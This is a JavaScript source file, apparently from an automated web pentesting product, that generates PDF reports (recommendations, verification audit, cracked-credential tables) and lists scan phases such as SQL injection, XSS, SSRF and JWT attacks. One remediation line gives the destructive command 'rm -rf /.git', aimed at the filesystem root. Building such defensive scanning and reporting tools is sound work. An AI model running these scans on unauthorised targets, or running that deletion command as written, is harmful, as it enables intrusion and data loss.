    // ─── RECOMMENDATIONS (dynamic from findings) ──────────────────
    // Build recommendations from what we actually FOUND on this target — every line
    // must be traceable to a real finding so customers don't see filler advice.
    const recs = [];
    // From gobuster — only count paths that ACTUALLY exist (HTTP 200/301/302).
    const _liveGo = (gobuster||[]).filter(d=>[200,301,302].includes(d.status));
    const gitExposed   = _liveGo.some(d=>(d.path||d).includes("/.git"));
    const configExposed= _liveGo.some(d=>/(config|database|backup|\.env|\.sql)/i.test(d.path||d));
    const setupExposed = _liveGo.some(d=>/(setup|install|phpinfo)/i.test(d.path||d));
    const adminExposed = _liveGo.some(d=>/\/admin/i.test(d.path||d));
    if(gitExposed)   recs.push({p:"CRITICAL",t:"Remove .git directory from web root — exposes full source code",          a:"rm -rf /.git"});
    if(configExposed)recs.push({p:"HIGH",    t:"Restrict /config/, /database/, /backup/ from public access",              a:"Add deny rules"});
    if(setupExposed) recs.push({p:"HIGH",    t:"Remove setup.php / install files — dangerous on production servers",      a:"Delete files"});
    if(adminExposed) recs.push({p:"HIGH",    t:"Protect /admin panel with IP whitelist or strong authentication",          a:"Restrict access"});
    // Critical roll-up — only when there ARE critical findings on this target.
    // `findings` is the deduped aggregated list (passed in from dlPDF as the
    // `findings` reportData prop), so counts here match the master table.
    const _findArr = findings || [];
    const critCount = _findArr.filter(f=>f.severity==="CRITICAL").length;
    const highCount = _findArr.filter(f=>f.severity==="HIGH").length;
    if(critCount>0) recs.push({p:"CRITICAL",t:`Address all ${critCount} CRITICAL finding(s) within 24 hours before next assessment`, a:"Immediate fix"});
    if(highCount>0 && critCount===0) recs.push({p:"HIGH", t:`Address ${highCount} HIGH-severity finding(s) within 7 days`, a:"Sprint priority"});
    // Header coverage — derive missing-header names from the aggregated findings list.
    const headerMissingFinds = _findArr.filter(f => /^missing\s/i.test(f.detail||"") && /(x-frame|csp|hsts|x-content|content-security|permissions-policy|cross-origin|referrer)/i.test(f.detail||""));
    const headersMissing = headerMissingFinds.map(f => (f.detail.match(/Missing\s+([A-Za-z-]+)/i)||[])[1]).filter(Boolean);
    if(headersMissing.length>0) recs.push({p:"HIGH", t:"Add missing HTTP security headers: "+headersMissing.slice(0,4).join(", "), a:"Update server config"});
    // Web app findings — these are individual destructured scanner-result objects
    if(cors&&cors.vulnerable) recs.push({p:"HIGH", t:"Fix CORS misconfiguration — restrict Access-Control-Allow-Origin to specific trusted origins", a:"Update CORS policy"});
    if(xss&&xss.vulnerable)  recs.push({p:"HIGH",  t:"Fix XSS vulnerability — sanitize and encode all user input, deploy CSP header", a:"Input validation"});
    if(sqlmap&&sqlmap.vulnerable) recs.push({p:"CRITICAL",t:"Parameterize all SQL queries immediately — SQL injection confirmed on target", a:"Use prepared stmts"});
    if(clickjacking&&clickjacking.vulnerable) recs.push({p:"MEDIUM", t:"Set X-Frame-Options: DENY or CSP frame-ancestors 'none' to block iframe embedding", a:"Add header"});
    if(verbtamper&&verbtamper.vulnerable) recs.push({p:"HIGH", t:"Disable dangerous HTTP methods (PUT/DELETE/TRACE/CONNECT) at the web server / reverse proxy layer", a:"Restrict methods"});
    if(ssrf&&ssrf.vulnerable) recs.push({p:"HIGH", t:"Block outbound requests to cloud metadata endpoints (169.254.169.254, metadata.google.internal) — SSRF confirmed", a:"Egress firewall"});
    if(xxe&&xxe.vulnerable) recs.push({p:"HIGH", t:"Disable external entity processing in XML parsers (libxml: LIBXML_NOENT off; Java: FEATURE_SECURE_PROCESSING)", a:"Patch parser config"});
    if(openredirect&&openredirect.vulnerable) recs.push({p:"MEDIUM", t:"Validate redirect URLs against a strict allow-list — prevent phishing via open redirect", a:"URL allow-list"});
    if(lfi&&lfi.vulnerable) recs.push({p:"CRITICAL", t:"Block path traversal in file-reading endpoints — sanitize/restrict to a known base directory", a:"Path canonicalize"});
    if(ssti&&ssti.vulnerable) recs.push({p:"CRITICAL", t:"Server-side template injection found — never pass user input directly to template engines", a:"Sandbox templates"});
    if(jwt&&jwt.vulnerable) recs.push({p:"CRITICAL", t:"Reject 'alg: none' JWTs and rotate to a 256-bit+ random HMAC secret — current secret is weak", a:"Rotate JWT key"});
    if(deserial&&deserial.vulnerable) recs.push({p:"CRITICAL", t:"Replace unsafe deserialization (pickle/PHP unserialize/Java ObjectInputStream) with JSON / schema-validated payloads", a:"Refactor parser"});
    if(fileupload&&fileupload.vulnerable) recs.push({p:"CRITICAL", t:"File upload accepts dangerous types — enforce MIME + magic-byte + extension allow-list, store outside web root", a:"Restrict uploads"});
    if(takeover&&takeover.vulnerable) recs.push({p:"HIGH", t:"Reclaim or remove dangling DNS records pointing to deprovisioned 3rd-party services", a:"Audit CNAMEs"});
    // SSL/TLS — show the actual issue rather than a generic note
    const sslHighFindings=(ssl&&ssl.findings||[]).filter(f=>f.severity==="HIGH"||f.severity==="CRITICAL");
    if(sslHighFindings.length>0) recs.push({p:"HIGH",  t:"Fix SSL/TLS issue: "+(sslHighFindings[0].detail||"").substring(0,90),a:"Update TLS config"});
    // Cookies
    const _allRawCookies = (() => {
      if (!cookies || !cookies.cookies) return [];
      if (Array.isArray(cookies.cookies.analyzed)) return cookies.cookies.analyzed;
      if (Array.isArray(cookies.cookies)) return cookies.cookies;
      return [];
    })();
    const insecureCookies=_allRawCookies.filter(c=>!c.secure||(!(c.httponly)&&!(c.http_only)));
    if(insecureCookies.length>0) recs.push({p:"MEDIUM",t:`Set Secure + HttpOnly + SameSite flags on ${insecureCookies.length} session cookie(s)`, a:"Update Set-Cookie"});
    // WAF — only recommend if static-host detection didn't already credit the CDN edge
    const _wafSkippedAsCdn = wafw00f && (wafw00f.skipped || /cdn|static/i.test(wafw00f.skipped_reason||""));
    if((!wafw00f||(!wafw00f.detected && !_wafSkippedAsCdn))) recs.push({p:"MEDIUM",t:"Deploy a Web Application Firewall (WAF) to filter malicious traffic at the edge", a:"Cloudflare / ModSec"});
    // Operational fillers — only added when we have very few specific recs.
    // On a heavy-finding report these would feel like padding, so we drop them.
    if(recs.length < 5){
      recs.push({p:"LOW", t:"Conduct monthly re-scans to track remediation progress and catch regressions", a:"Schedule scans"});
      recs.push({p:"LOW", t:"Keep web server, frameworks, and CMS plugins on the latest patched versions", a:"Patch management"});
    }
    if(recs.length<2){
      recs.push({p:"MEDIUM",t:"Enable comprehensive security logging and alerting on all endpoints (WAF events, auth failures, 5xx spikes)", a:"Configure logging"});
      recs.push({p:"LOW",   t:"Review and restrict file and directory permissions on web root (no world-writable)", a:"chmod / chown"});
    }
    chk(30);
    y+=2;
    y = sectionHead("Recommendations",y);
    y = tableHeader(["PRIORITY","RECOMMENDATION","ACTION"],[22,118,40],y);
    recs.forEach((r,i)=>{
      // Wrap recommendation text to its column width so long entries don't get cut.
      doc.setFont("Arial","normal"); doc.setFontSize(8.5);
      const recLines = doc.splitTextToSize(String(r.t||""), 115);
      const actLines = doc.splitTextToSize(String(r.a||""), 35);
      const lineCount = Math.max(recLines.length, actLines.length, 1);
      const rowH = Math.max(7, lineCount * 3.8 + 2);
      chk(rowH + 1);
      fillR(margin,y,contentW,rowH,i%2===0?LIGHT:WHITE);
      hline(margin,y,pageW-margin,y,BORDER,0.2);
      rrect(margin+3,y+1.5,16,4,1,sevColor(r.p)[1]);
      doc.setFont("Arial","bold"); doc.setFontSize(6.5); doc.setTextColor(...sevColor(r.p)[0]);
      doc.text(r.p,margin+4,y+5);
      doc.setFont("Arial","normal"); doc.setFontSize(8.5); doc.setTextColor(...DARK);
      recLines.forEach((ln, li) => doc.text(ln, margin+25, y+5 + li*3.8));
      doc.setFont("Arial","normal"); doc.setFontSize(7.5); doc.setTextColor(...GRAY);
      actLines.forEach((ln, li) => doc.text(ln, margin+143, y+5 + li*3.8));
      y += rowH;
    });

    // ─── VERIFICATION AUDIT ───────────────────────────────────
    // Trust signal: for every scanner that ran, show exactly WHAT it
    // tested. Customer's auditor can confirm we actually fired the
    // probes we claim. "What we tested for and didn't find" matters
    // as much as the findings list — proves negative space is real.
    const _scannerAudits = [];
    const _allResultsLocal = {  // reconstruct from props passed to generatePDF
      sqlmap, xss, cors, openredirect, sensitivefiles, hydra, ssrf, xxe,
      clickjacking, verbtamper, pollution, csrf, idor, ssti, fileupload,
      smuggling, responsesplitting, sessionfixation, dataexfil, racecondition,
      deserial, protopollution, typejuggling, jwt, graphql, nosql, oauth,
      hostheader, websocket, takeover, otp, commix, lfi, rfi, smb, ftp, smtp, snmp,
    };
    Object.entries(_allResultsLocal).forEach(([tool, res]) => {
      if (!res) return;
      if (!res.tests_summary && !res.tests_performed) return;
      _scannerAudits.push({
        tool,
        tests: res.tests_performed || "—",
        summary: res.tests_summary || "Active probe completed",
        found: (res.findings || []).filter(f => f.severity !== "INFO").length,
      });
    });
    if (_scannerAudits.length > 0) {
      chk(20); y += 3;
      y = sectionHead("Verification Audit",y);
      doc.setFont("Arial","italic"); doc.setFontSize(7); doc.setTextColor(...GRAY);
      doc.text("What each scanner actively tested — proves the negative space (what we looked for and didn't find) is as real as the positive findings.", margin+2, y);
      doc.setFont("Arial","normal"); y += 4;
      y = tableHeader(["TOOL","PROBES","WHAT WAS TESTED","FOUND"],[30,15,110,20],y);
      _scannerAudits.forEach((a,i)=>{
        const lines = doc.splitTextToSize(String(a.summary||""), 108);
        const h = Math.max(7, lines.length * 3.6 + 2);
        chk(h+1);
        fillR(margin,y,contentW,h,i%2===0?LIGHT:WHITE);
        hline(margin,y,pageW-margin,y,BORDER,0.2);
        doc.setFont("Arial","bold"); doc.setFontSize(8); doc.setTextColor(...BLUE);
        doc.text(a.tool, margin+3, y+5);
        doc.setFont("Arial","normal"); doc.setFontSize(8); doc.setTextColor(...DARK);
        doc.text(String(a.tests), margin+33, y+5);
        lines.forEach((ln,li)=>doc.text(ln, margin+48, y+5 + li*3.6));
        // Found count
        const foundColor = a.found > 0 ? [162,28,28] : [15,118,82];
        doc.setFont("Arial","bold"); doc.setFontSize(8); doc.setTextColor(...foundColor);
        doc.text(a.found > 0 ? `${a.found} HIT` : "0 OK", pageW-margin-15, y+5);
        y += h;
      });
      y += 6;
    }

    // End-of-report block — placed right after last recommendation row
    chk(38);
    const bY = y+8;
    fillR(margin,bY,contentW,30,LBLUE);
    fillR(margin,bY,3,30,BLUE);
    txt("— END OF REPORT —",pageW/2,bY+8,10,BLUE,true,"center");
    txt("Generated by VulnusLab — automated security scanning by VulnusLab engine.",pageW/2,bY+14,6.5,GRAY,false,"center");
    txt("All findings require manual verification. This document is CONFIDENTIAL — restricted to authorized personnel only.",pageW/2,bY+18,6,GRAY,false,"center");
    txt("vulnuslab.com  ·  support@vulnuslab.com",pageW/2,bY+25,7,BLUE,true,"center");
    y=bY+30;

    // ─── BORDER + FOOTER ALL PAGES ───────────────────────────────
    const total=doc.internal.getNumberOfPages();
    for(let i=1;i<=total;i++){
      doc.setPage(i);
      // Blue border on every page
      doc.setDrawColor(59,130,246); doc.setLineWidth(1.2);
      doc.rect(0,0,210,297,'S');
      if(i>=2){
        txt((companyName||"VulnusLab")+" | CONFIDENTIAL  ·  vulnuslab.com",margin,290,6.5,GRAY);
        txt("Page "+i+" of "+total,pageW-margin,290,6.5,BLUE,false,"right");
      }
    }

    doc.save(`pentest_${_pdfFn(target)}_${_pdfDt()}.pdf`);
  } catch(e) {
    console.error("PDF generation error:", e);
    alert("PDF error: " + e.message + "\n\nCheck browser console for details.");
  }
}

// Lightweight per-module PDF (VulnModule, PasswordModule, etc.)
function generateModuleReport(reportData) {
  const { moduleName, tool, toolLabel, target, findings, cracked, summary,
          companyName, reporterName, reporterRole, template, date } = reportData;

  const doc = new jsPDF({ orientation:"portrait", unit:"mm", format:"a4" });
    const pageW=210, margin=15, contentW=180;
    let y=0;

    const ACCENT_MAP = {standard:[15,110,86],corporate:[59,130,246],red:[239,68,68],gold:[245,158,11]};
    const GREEN  = ACCENT_MAP[template] || ACCENT_MAP.standard;
    const DGREEN = GREEN.map(v=>Math.max(0,Math.round(v*0.7)));
    const RED    = [162,28,28];
    const ORANGE = [133,79,11];
    const DARK   = [15,23,42];
    const LIGHT  = [248,250,252];
    const WHITE  = [255,255,255];
    const BORDER = [226,232,240];
    const GRAY   = [100,116,139];
    const PURPLE = [109,40,217];

    const fillR = (x,yy,w,h,c) => { doc.setFillColor(...c); doc.rect(x,yy,w,h,"F"); };
    const rrect = (x,yy,w,h,r,c) => { doc.setFillColor(...c); doc.roundedRect(x,yy,w,h,r,r,"F"); };
    const hline = (x1,y1,x2,y2,c,lw) => { doc.setDrawColor(...c); doc.setLineWidth(lw||0.3); doc.line(x1,y1,x2,y2); };
    const txt = (t,x,yy,sz,c,bold,align) => {
      doc.setFont("Arial", bold?"bold":"normal");
      doc.setFontSize(sz||10);
      doc.setTextColor(...(c||DARK));
      doc.text(String(t),x,yy,{align:align||"left"});
    };
    const BLUE = [59,130,246];
    const drawHeader = () => {
      txt((companyName||"VulnusLab")+" — "+moduleName+" Report",margin,10,7,GRAY);
      txt(date||new Date().toLocaleDateString("en-GB"),pageW-margin,10,7,GREEN,false,"right");
    };
    const newPage = () => { doc.addPage(); y=18; drawHeader(); };
    const chk = n => { if(y+n>278) newPage(); };
    const sectionHead = (title,yy) => {
      txt(title,margin,yy,11,BLUE,true,"left");
      return yy+9;
    };
    const tableHeader = (cols,widths,yy) => {
      fillR(margin,yy,contentW,8,GREEN);
      let cx=margin+3;
      cols.forEach((c,i)=>{ txt(c,cx,yy+5.5,7.5,WHITE,true); cx+=widths[i]; });
      return yy+8;
    };

    // ── COVER PAGE ──────────────────────────────────────────────
    fillR(0,0,pageW,297,DARK);
    // Top accent bar
    fillR(0,0,pageW,3,GREEN);
    // Module name
    const cx=pageW/2;
    doc.setFont("Arial","bold"); doc.setFontSize(9); doc.setTextColor(...GREEN);
    doc.text((companyName||"VulnusLab").toUpperCase(),cx,42,{align:"center"});
    doc.setFont("Arial","bold"); doc.setFontSize(22); doc.setTextColor(...WHITE);
    doc.text(moduleName,cx,58,{align:"center"});
    doc.setFont("Arial","normal"); doc.setFontSize(11); doc.setTextColor(...GRAY);
    doc.text("Security Assessment Report",cx,67,{align:"center"});

    // Info rows
    const irows=[["Target",target||"—"],["Tool",toolLabel||tool||"—"],["Scan Date",date||new Date().toLocaleDateString("en-GB")],["Prepared By","__REPORTER__"]];
    let iy=80;
    irows.forEach(r=>{
      const rh = r[1]==="__REPORTER__" ? 11 : 7;
      fillR(margin,iy,contentW,rh,r[1]==="__REPORTER__"?[20,30,55]:[10,20,40]);
      hline(margin,iy,margin+3,iy,GREEN,1.5);
      txt(r[0],margin+6,iy+5,7.5,GRAY);
      if(r[1]==="__REPORTER__"){
        txt(reporterName||"VulnusLab Automated Pentest",margin+48,iy+4.5,8.5,WHITE,true);
        txt(reporterRole||"Security Assessment Engine · vulnuslab.com",margin+48,iy+9,7,GRAY);
      } else {
        txt(String(r[1]),margin+48,iy+5,8.5,WHITE,true);
      }
      iy+=rh+2;
    });

    // Risk summary bar
    const visFinds = (findings||[]).filter(f=>f.severity!=="INFO");
    const _riskPenalty = visFinds.reduce((s,f)=>s+({CRITICAL:15,HIGH:8,MEDIUM:3,LOW:1}[f.severity]||0),0);
    const riskScore = Math.max(0, 100 - _riskPenalty);
    const rColor = riskScore<40?RED:riskScore<70?ORANGE:riskScore<90?[133,100,0]:GREEN;
    const rDisp = riskScore<40?"CRITICAL RISK":riskScore<70?"HIGH RISK":riskScore<90?"MEDIUM RISK":riskScore<100?"LOW RISK":"SECURE";
    if(iy < 225){
      iy+=6;
      fillR(margin,iy,contentW,14,LIGHT.map(v=>Math.round(v*0.12)));
      hline(margin,iy,margin,iy+14,rColor,2);
      doc.setFont("Arial","bold"); doc.setFontSize(20); doc.setTextColor(...rColor);
      doc.text(String(riskScore),margin+6,iy+10);
      doc.setFont("Arial","normal"); doc.setFontSize(8); doc.setTextColor(...GRAY);
      doc.text("/100",margin+20,iy+10);
      const trackX=margin+38, trackW=contentW-40, barFill=Math.max((riskScore/100)*trackW,2);
      doc.setFillColor(30,40,60); doc.rect(trackX,iy+4,trackW,6,"F");
      doc.setFillColor(...rColor); doc.rect(trackX,iy+4,barFill,6,"F");
      doc.setFont("Arial","bold"); doc.setFontSize(8); doc.setTextColor(...rColor);
      doc.text(rDisp,trackX+trackW+2,iy+9);
    }

    // Finding counts
    iy+=22;
    const countsBySev = {CRITICAL:0,HIGH:0,MEDIUM:0,LOW:0,INFO:0};
    (findings||[]).forEach(f=>{ if(countsBySev[f.severity]!==undefined) countsBySev[f.severity]++; });
    const sevEntries = Object.entries(countsBySev).filter(([,v])=>v>0);
    if(sevEntries.length>0){
      const bw = Math.min(30, contentW/sevEntries.length);
      let bx=margin;
      sevEntries.forEach(([sev,cnt])=>{
        const [bg,lt]=sevColor(sev);
        fillR(bx,iy,bw-2,16,lt.map(v=>Math.round(v*0.3)));
        doc.setFont("Arial","bold"); doc.setFontSize(16); doc.setTextColor(...bg);
        doc.text(String(cnt),bx+bw/2-2,iy+11,{align:"center"});
        doc.setFontSize(6); doc.setTextColor(...GRAY);
        doc.text(sev,bx+bw/2-2,iy+15.5,{align:"center"});
        bx+=bw;
      });
    }

    // Cover footer
    txt("CONFIDENTIAL — Authorized Use Only — "+(companyName||"VulnusLab"),pageW/2,290,7,GRAY,false,"center");

    // ── PAGE 2 — FINDINGS ───────────────────────────────────────
    newPage();
    y = sectionHead("Findings",y);

    // Password module: show cracked credentials
    if(cracked&&cracked.length>0){
      y = tableHeader(["USERNAME","PASSWORD","SERVICE"],[60,60,60],y);
      cracked.forEach((c,i)=>{
        chk(7); fillR(margin,y,contentW,7,i%2===0?LIGHT:WHITE); hline(margin,y,pageW-margin,y,BORDER,0.2);
        txt(c.username||"",margin+3,y+5,8.5,DARK,true);
        txt(c.password||"",margin+63,y+5,8.5,RED,true);
        txt(c.service||"",margin+123,y+5,8,GRAY);
        y+=7;
      });
      y+=4;
    }

    // Vulnerability findings
    const visF = (findings||[]).filter(f=>f.severity!=="INFO");
    if(visF.length>0){
      visF.forEach((f,idx)=>{
        const dl=doc.splitTextToSize(f.detail||"",contentW-8);
        const rl=doc.splitTextToSize(f.remediation||"Apply security hardening.",contentW-22);
        const needed=Math.max(28, 19+(dl.length+rl.length)*4.5);
        chk(needed);
        const [bg,lt]=sevColor(f.severity);
        fillR(margin,y,contentW,needed,idx%2===0?LIGHT:WHITE);
        hline(margin,y,pageW-margin,y,BORDER,0.2);
        hline(margin,y,margin,y+needed,bg,1.5);
        txt(String(idx+1)+".",margin+2,y+6,7.5,GRAY,true);
        rrect(margin+11,y+2,20,5,1,lt);
        doc.setFont("Arial","bold"); doc.setFontSize(7); doc.setTextColor(...bg);
        doc.text(f.severity,margin+12,y+6);
        doc.setFont("Arial","normal"); doc.setFontSize(6.5); doc.setTextColor(...PURPLE);
        doc.text((f.cwe||""),margin+35,y+6);
        txt(f.cvss||"",margin+80,y+6,8,bg,true);
        doc.setFont("Arial","normal"); doc.setFontSize(8); doc.setTextColor(...DARK);
        doc.text(dl,margin+4,y+12);
        const fixY=y+10+dl.length*4.5;
        const fixH=rl.length*4.5+6;
        fillR(margin+3,fixY,contentW-6,fixH,[240,253,244]);
        hline(margin+3,fixY,margin+3,fixY+fixH,GREEN,1);
        doc.setFont("Arial","bold"); doc.setFontSize(7); doc.setTextColor(...DGREEN);
        doc.text("Fix:",margin+5,fixY+4.5);
        doc.setFont("Arial","normal"); doc.setTextColor(...DARK);
        doc.text(rl,margin+16,fixY+4.5);
        y+=needed+2;
      });
    } else if(!cracked||cracked.length===0){
      fillR(margin,y,contentW,10,LIGHT);
      txt(summary||"No findings recorded for this scan.",margin+4,y+7,8.5,GRAY);
      y+=12;
    }

    // INFO findings summary
    const infoF = (findings||[]).filter(f=>f.severity==="INFO");
    if(infoF.length>0){
      chk(20); y+=4;
      y = sectionHead("Informational",y);
      infoF.slice(0,15).forEach((f,i)=>{
        chk(7); fillR(margin,y,contentW,7,i%2===0?LIGHT:WHITE); hline(margin,y,pageW-margin,y,BORDER,0.2);
        txt(f.detail||"",margin+3,y+5,8,GRAY);
        y+=7;
      });
    }

    // Borders + footers on all pages
    const total=doc.internal.getNumberOfPages();
    for(let i=1;i<=total;i++){
      doc.setPage(i);
      doc.setDrawColor(59,130,246); doc.setLineWidth(1.2);
      doc.rect(0,0,210,297,'S');
      if(i>=2){
        txt((companyName||"VulnusLab")+" | CONFIDENTIAL",margin,290,6.5,GRAY);
        txt("Page "+i+" of "+total,pageW-margin,290,6.5,BLUE,false,"right");
      }
    }

    doc.save(`${(tool||moduleName.replace(/\s+/g,"_").toLowerCase())}_${_pdfFn(target)}_${_pdfDt()}.pdf`);
}


// ReconModule is defined below (before ZAPModule)


// ── Section 1: Reconnaissance & Fingerprinting (OSWA Phase 1) ──
// ── Section 2: Discovery & Fuzzing ──────────────────────────────
// ── Section 3: Injection Attacks (OSWA Core) ────────────────────
// ── Section 4: Authentication & Session (OSWA + OSWE) ───────────
// ── Section 5: File & Path Attacks (OSWA) ───────────────────────
// ── Section 6: Network & Protocol Attacks (OSWA) ────────────────
// ── Section 7: Modern Web Vulnerabilities (OSWE Focus) ──────────
// ── Section 8: Infrastructure & Services (OSCP) ─────────────────
const PHASES = [
  // ── Discovery (runs FIRST — populates scan_state.json for every later scanner)
  {name:"SPA Crawler",            tool:"spa_crawler",   endpoint:"/api/scan/spa_crawler",       icon:"🕷️"},
  // ── Reconnaissance & Fingerprinting ─────────────────────────
  {name:"CMS Detection",          tool:"cms",           endpoint:"/api/scan/cms",               icon:"📦"},
  {name:"SSL/TLS Analysis",       tool:"ssl",           endpoint:"/api/scan/ssl",               icon:"🔒"},
  {name:"DNS Enumeration",        tool:"dns",           endpoint:"/api/scan/dns",               icon:"🔎"},
  {name:"Tech Fingerprinting",    tool:"techstack",     endpoint:"/api/scan/techstack",         icon:"🔍"},
  {name:"Port Scanning",          tool:"portscan",      endpoint:"/api/scan/portscan",          icon:"🔌"},
  {name:"SSL Certificate Audit",  tool:"ssl_cert",      endpoint:"/api/scan/ssl_cert",          icon:"📜"},
  // ── Injection Attacks ───────────────────────────────────────
  {name:"XSS Testing",            tool:"xss",           endpoint:"/api/scan/xss",               icon:"⚡"},
  {name:"SQL Injection",          tool:"sqli",          endpoint:"/api/scan/sqli",              icon:"💉"},
  {name:"Command Injection",      tool:"cmd_injection", endpoint:"/api/scan/cmd_injection",     icon:"💻"},
  {name:"XXE Injection",          tool:"xxe",           endpoint:"/api/scan/xxe",               icon:"📄"},
  // ── Authentication & Session ────────────────────────────────
  {name:"Security Headers",       tool:"headers",       endpoint:"/api/scan/headers",           icon:"📋"},
  {name:"Cookie Analysis",        tool:"cookies",       endpoint:"/api/scan/cookies",           icon:"🍪"},
  {name:"CSRF Testing",           tool:"csrf",          endpoint:"/api/scan/csrf",              icon:"🛡"},
  {name:"JWT Attacks",            tool:"jwt",           endpoint:"/api/scan/jwt",               icon:"🎟"},
  // ── File & Path Attacks ─────────────────────────────────────
  {name:"Path Traversal / LFI",   tool:"lfi",           endpoint:"/api/scan/lfi",               icon:"📂"},
  {name:"Exposed Files",          tool:"exposed_files", endpoint:"/api/scan/exposed_files",     icon:"🗂"},
  // ── Network & Protocol Attacks ──────────────────────────────
  {name:"CORS Testing",           tool:"cors",          endpoint:"/api/scan/cors",              icon:"🌐"},
  {name:"SSRF Testing",           tool:"ssrf",          endpoint:"/api/scan/ssrf",              icon:"🔄"},
  {name:"HTTP Methods",           tool:"http_methods",  endpoint:"/api/scan/http_methods",      icon:"🔀"},
  {name:"Open Redirect",          tool:"open_redirect", endpoint:"/api/scan/open_redirect",     icon:"↩"},
  {name:"Clickjacking",           tool:"clickjacking",  endpoint:"/api/scan/clickjacking",      icon:"🖱"},
  // ── Access Control & Modern API Bugs ────────────────────────
  {name:"IDOR",                   tool:"idor",            endpoint:"/api/scan/idor",            icon:"🔓"},
  {name:"Mass Assignment",        tool:"mass_assignment", endpoint:"/api/scan/mass_assignment", icon:"🧬"},
  {name:"NoSQL Injection",        tool:"nosql",           endpoint:"/api/scan/nosql",           icon:"🍃"},
  {name:"Broken Access Control",  tool:"access_control",  endpoint:"/api/scan/access_control",  icon:"🚧"},
  // ── Framework-Specific ──────────────────────────────────────
  {name:"Nuclei Templates",       tool:"nuclei",        endpoint:"/api/scan/nuclei",            icon:"☢️"},
  {name:"Force Browse",          tool:"force_browse",  endpoint:"/api/scan/force_browse",     icon:"🔦"},
  {name:"File Upload",          tool:"file_upload",      endpoint:"/api/scan/file_upload",       icon:"🗃️"},
  {name:"SSTI",          tool:"ssti",      endpoint:"/api/scan/ssti",       icon:"📜"},
  {name:"GraphQL Audit",          tool:"graphql",      endpoint:"/api/scan/graphql",       icon:"◈"},
  {name:"Sensitive Data",          tool:"sensitive_data",      endpoint:"/api/scan/sensitive_data",       icon:"🔍"},
  {name:"Stored XSS",          tool:"stored_xss",      endpoint:"/api/scan/stored_xss",       icon:"💾"},
  {name:"WordPress Scanner",      tool:"wpscan",        endpoint:"/api/scan/wpscan",            icon:"📝"},
];

// Section header definitions — keyed by the first tool in each section
const SECTION_HEADERS = {
  "wafw00f":       {label:"Section 1 — Reconnaissance & Fingerprinting", sub:"OSWA Phase 1 • 11 scanners", color:"#3b82f6"},
  "gobuster":      {label:"Section 2 — Discovery & Fuzzing",             sub:"OSWA Phase 2 • 2 scanners",  color:"#06b6d4"},
  "xss":           {label:"Section 3 — Injection Attacks",               sub:"OSWA Core • 7 scanners",     color:"#ef4444"},
  "headers":       {label:"Section 4 — Authentication & Session",        sub:"OSWA + OSWE • 9 scanners",   color:"#a855f7"},
  "lfi":           {label:"Section 5 — File & Path Attacks",             sub:"OSWA • 3 scanners",          color:"#f97316"},
  "cors":          {label:"Section 6 — Network & Protocol Attacks",      sub:"OSWA • 10 scanners",         color:"#0891b2"},
  "deserial":      {label:"Section 7 — Modern Web Vulnerabilities",      sub:"OSWE Focus • 5 scanners",    color:"#22c55e"},
  "smb":           {label:"Section 8 — Infrastructure & Services",       sub:"OSCP • 4 scanners",          color:"#eab308"},
};

// Tools trial users can access in Web App Pentesting (Section 1 recon only)
const TRIAL_TOOLS = new Set(["wafw00f","whatweb","cms","nmap","ssl"]);

function WebAppModule(props) {
  const token = props.token;
  const isTrial      = props.isTrial || false;
  const isSuperAdmin = props.isSuperAdmin || false;
  const onRunningChange = props.onRunningChange || (() => {});
  const [target,setTarget]     = useState("");
  const [running,setRunning]   = useState(false);
  const [curPhase,setCurPhase] = useState(-1);
  const [done,setDone]         = useState([]);
  const [failed,setFailed]     = useState([]);
  const [skipped,setSkipped]   = useState([]);
  const [allResults,setAll]    = useState({});
  const [finished,setFinished] = useState(false);
  const [lines,setLines]       = useState(["Ready — enter target URL and click Start"]);
  const [tab,setTab]           = useState("phases");
  const [stopped,setStopped]   = useState(false);
  const stopRef                = useRef(false);
  const [selectedPhases, setSelectedPhases] = useState(() => new Set(PHASES.map((_,i)=>i)));
  const [showPDFModal, setShowPDFModal]     = useState(false);
  const [pdfConfig, setPDFConfig]           = useState({
    companyName:"VulnusLab", reporterName:"VulnusLab Automated Pentest", reporterRole:"Security Assessment Engine · vulnuslab.com",
    date: new Date().toLocaleDateString("en-GB",{day:"2-digit",month:"long",year:"numeric"}),
    template:"standard", customLogo:null
  });
  const [authCookie, setAuthCookie]         = useState(() => localStorage.getItem("cyberAuthCookie")||"");
  const [authBearer, setAuthBearer]         = useState(() => localStorage.getItem("cyberAuthBearer")||"");
  const [showAuthPanel, setShowAuthPanel]   = useState(false);
  // ── Auto-login fields. When the user fills these in and clicks the
  // "Auto-login" button, we POST to /api/scan/login, capture the session
  // cookie, and stash it in authCookie so every downstream scanner uses
  // it automatically (existing plumbing handles the rest). ──
  const [loginUrl, setLoginUrl]             = useState("");
  const [loginUser, setLoginUser]           = useState("");
  const [loginPass, setLoginPass]           = useState("");
  const [autoLoginBusy, setAutoLoginBusy]   = useState(false);
  const [autoLoginStatus, setAutoLoginStatus] = useState(null); // null | "ok" | "fail" | msg
  const [customWordlist, setCustomWordlist] = useState(null);
  const [targetHistory, setTargetHistory]   = useState(() => { try { return JSON.parse(localStorage.getItem("cyberTargetHistory")||"[]"); } catch{return [];} });
  const [showHistory, setShowHistory]       = useState(false);
  const [authorized, setAuthorized]         = useState(false);
  // Which tile (phase index) is currently expanded showing its result details.
  // Click "Details" on any finished tile to inspect error message + findings;
  // saves the customer from opening DevTools to debug a failed scan.
  const [expandedTile, setExpandedTile]     = useState(null);
  // Live scan telemetry — scanStart is the timestamp the run loop began;
  // tickN is just a counter incremented every 1s while running so React
  // re-renders the elapsed/ETA banner. Findings counts derive from allResults
  // on each render — no useMemo needed, the cost is trivial.
  const [scanStart, setScanStart] = useState(0);
  // eslint-disable-next-line no-unused-vars
  const [tickN, setTickN]         = useState(0);
  useEffect(() => {
    if (!running) return;
    const id = setInterval(() => setTickN(n => n + 1), 1000);
    return () => clearInterval(id);
  }, [running]);
  // Live finding counts — recomputed every render (cheap; <100 findings).
  const liveCounts = (() => {
    const c = { CRITICAL: 0, HIGH: 0, MEDIUM: 0, LOW: 0 };
    Object.values(allResults || {}).forEach(r => {
      if (r && r.findings) r.findings.forEach(f => {
        if (f.severity && c[f.severity] !== undefined) c[f.severity]++;
      });
      if (r && r.vulnerable && r.tool === "sqlmap") c.CRITICAL++;
      if (r && r.vulnerable && r.tool === "xss")    c.CRITICAL++;
    });
    return c;
  })();

  const add = l => setLines(p => [...p, l]);

  const setRunningState = (val) => {
    setRunning(val);
    onRunningChange(val);
  };

  const stop = () => {
    stopRef.current = true;
    setStopped(true);
  };

  const run = async() => {
    if (!target.trim()) return;
    // Auto-add http:// if user typed just a domain or IP
    const normTarget = (t => t.startsWith("http://") || t.startsWith("https://") ? t : "http://" + t)(target.trim());
